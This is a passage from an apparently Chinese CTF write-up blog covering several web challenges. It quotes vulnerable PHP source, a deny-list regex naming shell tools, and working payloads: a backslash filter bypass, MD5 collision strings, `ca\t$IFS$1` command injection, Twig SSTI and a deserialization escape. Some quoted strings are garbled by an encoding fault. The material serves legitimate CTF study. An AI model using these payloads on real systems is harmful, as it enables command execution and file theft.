invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:<span class="title function_ invoke__">url</span>(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>通过源码解读，可以发现file参数的作用应该就是用来读这个源码的，下面应该用不到他了，现在主要就是传cmd参数和post的a和b。</p><p>首先是cmd参数的过滤问题，他过滤了我所知道的所有能查看文件的命令，所以这个地方能绕过就更好了，实际上这的确是可以绕过的。</p><p>能绕过的关键就出在反斜杠上，上测试结果就知道了。</p><p><strong>本地测试代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>传参的内容及结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?cmd=ls</span><br><span class="line">forbid ~</span><br><span class="line"></span><br><span class="line">?cmd=l\s</span><br><span class="line">l\s</span><br><span class="line"></span><br><span class="line">?cmd=\</span><br><span class="line">\</span><br></pre></td></tr></table></figure><p>对反斜杠不进行禁止，在linux中反斜杠也不影响命令的执行</p><p><img src="../images/image-20230407210831767.png" alt="image-20230407210831767"></p><p>这样，前面的反斜杠可以绕过检测，后面反斜杠还不影响命令的正常执行，那这不就等于过滤了个寂寞嘛。</p><p>过了preg_match的检测，最后一步就是过md5的强碰撞了，也就是本题的核心。</p><p>之前做的md5的题也用了md5的强碰撞（准确来讲应该叫强比较），当时是用传数组的方法通过检测的，而现在不可以这样做了，因为他多了一步强转的操作，这步操作就会使数组失效，所以得找工具或者找别人提供的可以进行md5强碰撞的内容来测试了。</p><p>这里找到两种版本，用谁都一样（仔细观察可以发现他两是一样的）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br><span class="line"></span><br><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><p>这里得需要用burpsuit来传参</p><p><img src="../images/image-20230407211239049.png" alt="image-20230407211239049"></p><p>成功拿到flag</p><h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><p>题目</p><p> <img src="../images/image-20230407211403556.png" alt="image-20230407211403556"></p><p>扫目录发现robots.txt文件</p><p><img src="../images/image-20230407211447353.png" alt="image-20230407211447353"></p><p>发现有个php文件</p><p><img src="../images/image-20230407211509028.png" alt="image-20230407211509028"></p><p>和名字是一样的，是一个假的flag</p><p>然后对这个页面进行抓包查看一下</p><p><img src="../images/image-20230407211626979.png" alt="image-20230407211626979"></p><p>发现回应头有个文件</p><p><img src="../images/image-20230407211709477.png" alt="image-20230407211709477"></p><p>读到了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;鎴戜笉缁忔剰闂寸湅浜嗙湅鎴戠殑鍔冲姏澹�, 涓嶆槸鎯崇湅鏃堕棿, 鍙槸鎯充笉缁忔剰闂�, 璁╀綘鐭ラ亾鎴戣繃寰楁瘮浣犲ソ.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;閲戦挶瑙ｅ喅涓嶄簡绌蜂汉鐨勬湰璐ㄩ棶棰�&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;鍘婚潪娲插惂&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span>==<span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;鎯冲埌杩欎釜CTFer鎷垮埌flag鍚�, 鎰熸縺娑曢浂, 璺戝幓涓滄緶宀�, 鎵句竴瀹堕鍘�, 鎶婂帹甯堣桨鍑哄幓, 鑷繁鐐掍袱涓嬁鎵嬪皬鑿�, 鍊掍竴鏉暎瑁呯櫧閰�, 鑷村瘜鏈夐亾, 鍒灏忔毚.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;鎴戣刀绱у枈鏉ユ垜鐨勯厭鑲夋湅鍙�, 浠栨墦浜嗕釜鐢佃瘽, 鎶婁粬涓€瀹跺畨鎺掑埌浜嗛潪娲�&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;鍘婚潪娲插惂&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;鎯冲埌杩欓噷, 鎴戝厖瀹炶€屾鎱�, 鏈夐挶浜虹殑蹇箰寰€寰€灏辨槸杩欎箞鐨勬湸瀹炴棤鍗�, 涓旀灟鐕�.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;蹇埌闈炴床浜�&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;鍘婚潪娲插惂&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>就是绕过if判断</p><p><strong>level1</strong></p><p>进行分析level 1发现是intval函数，此函数在处理数据时会在接触到字符串时停止，因此如果输入100e2之类的数据，会解释称100，但后面在执行+1时，100e2是解释称10000的，因此此处使用100e2绕过</p><p><strong>level2</strong></p><p>进行分析level 2发现是md5的弱类型比较，==在比较数据的时候会进行类型的转换，因此只需要查找这种数据就行，此处采用：0e215962017，结果如下：</p><p>类型转化后两个都为0,所以相等</p><p><strong>level3</strong></p><p><img src="../images/image-20230407212708516.png" alt="image-20230407212708516"></p><p><strong>strstr</strong>    的意思 </p><p><img src="../images/image-20230407212749188.png" alt="image-20230407212749188"></p><p>第三处过滤，对cat和空格进行过滤，因此先采用ls或dir来获取目录信息</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/fl4g.php?num=<span class="number">100e2</span>&amp;md5=<span class="number">0e215962017</span>&amp;get_flag=ca\t$IFS$<span class="number">1</span>fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p>题目</p><p><a href="https://www.hetianlab.com/specialized/20211217155625">以Twig模板为例浅学一手SSTI</a></p><p><img src="../images/image-20230407213346332.png" alt="image-20230407213346332"></p><p>在flag页面进行尝试的时候发现，这个模板是     Twig 模板引擎</p><p>也就是说是考查ssti的</p><p>尝试RCE ,发现似乎会检测输入的内容</p><p><img src="../images/image-20230407213639935.png" alt="image-20230407213639935"></p><p>题目提示是cookie,那我们就去cookie处看看</p><p><img src="../images/image-20230407213815921.png" alt="image-20230407213815921"></p><p>那我们就尝试在user处进行RCE</p><p><img src="../images/image-20230407214049562.png" alt="image-20230407214049562"></p><p>拿到flag</p><h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>题目</p><p><img src="../images/image-20230407214558920.png" alt="image-20230407214558920"></p><p>给了一个提示，说是网站源码</p><p>下载下来查看</p><p>足足有36万行代码</p><p>所以我们就得写个脚本来查看一下哪些是有用的了</p><p>这道题就是考察脚本的编写能力</p><p><a href="https://www.wangan.com/docs/268">大佬写的wp</a></p><p>看大佬写的就行了</p><h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><p>题目</p><p><img src="../images/image-20230407215924361.png" alt="image-20230407215924361"></p><p>拿到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先让参数f等于“phpinfo”，因为题目提示说这里可能会找到些东西。</p><p>在phpinfo里看到了这个：</p><p><img src="../images/image-20230408190916573.png" alt="image-20230408190916573"></p><p>提示有一个文件，那么现尝试一下直接读取  那一般来说肯定是读取不到的</p><p><strong>很明显是要读取这个文件，代码里读取文件的地方在这里：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读取的是base64解码后的$userinfo[‘img’]，$userinfo的值是$serialize_info的反序列化对象，$serialize_info是经过自定义函数过滤的序列化后的$_SESSION。</p><p>这个自定义函数filter惹祸了，考察了知识点：<strong>反序列化字符逃逸。</strong></p><p>只能让img_path为空，并把guest_img.png逃逸出去。</p><p>先本地测试，看看序列化后的字符串是什么样的:</p><p><img src="../images/image-20230408192908200.png" alt="image-20230408192908200"></p><p>然后是变量覆盖后的序列化结果</p><p><img src="../images/image-20230408193210085.png" alt="image-20230408193210085"></p><p>这里就是关键了，可以让传进来的值使得覆盖掉后面的img内容，因为有filter函数会进行匹配，匹配到替换为空，然后用来的字符串长度不变，就会接着匹配适合的长度，这个适合的长度我们就得进行计算，然后使得img里的值为flag的base64编码值</p><p>(和show的字符串逃逸差不多)</p><p><img src="../images/image-20230408193734376.png" alt="image-20230408193734376"></p><p>这是我们要传的值</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[imgphpflag]=;s:3:&quot;123&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br></pre></td></tr></table></figure><p>反序列化后的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:10:&quot;img&quot;;s:50:&quot;;s:3:&quot;123&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br></pre></td></tr></table></figure><p><strong>思路</strong></p><p>就是把自己在本地创建好的payload写上去，然后根据传的参数名字的payload</p><p>长度计算好，然后在传进去一个那个变量的内容，然后在把后面的img传进去就好了<br><strong>能看懂序列化出来的东西是咋样组成的就行</strong></p><h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>题目</p><p><img src="../images/image-20230408200347832.png" alt="image-20230408200347832"></p><p>一个购买东西的平台</p><p><img src="../images/image-20230408200457185.png" alt="image-20230408200457185"></p><p>可以看到在charset=”utf-8”后面有提示，这里非常重要。</p><p>但是很多的网站都是utf-8编码，为什么会说这里很重要?</p><p>回到购买界面，我们输入其他的价格，发现输入10的时候有提示</p><p><img src="../images/image-20230408200520327.png" alt="image-20230408200520327"></p><p>告诉了我们只能使用一个字符，一个字符能够购买的就只有前三只独角兽，虽然我也没有购买成功hhh</p><p>所以猜测只要购买了第四只独角兽，就能获取flag，于是我们需要找到一个字符比1337大的数字</p><p><strong>也就是utf-8编码的转换安全问题</strong></p><p><a href="https://xz.aliyun.com/t/5402#toc-8">浅谈Unicode设计的安全性</a></p><p><a href="https://blog.lyle.ac.cn/2018/10/29/unicode-normalization/">Unicode等价性浅谈</a></p><p>就是可以通过一些相同含义的数字但不同样子的数字或者字母可以用来绕过过滤</p><p><img src="../images/image-20230408201042425.png" alt="image-20230408201042425"></p><p>它和英文字母a都能访问baidu.com</p><p>所以说在过滤a的时候可以用它来进行绕过</p><p>这里解题的关键就是找一个单个字符是大于1337的</p><p>这里就得用到一个网站了</p><p><a href="https://www.compart.com/en/unicode/U+10123">unicode</a>    </p><p><img src="../images/image-20230408201802214.png" alt="image-20230408201802214"></p><p>然后随便点一个大于1337的就行了</p><p><img src="../images/image-20230408201842658.png" alt="image-20230408201842658"></p><p>然后将0x换成%进行传参就好了</p><p>其实中文的万也行   亿也行</p><h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 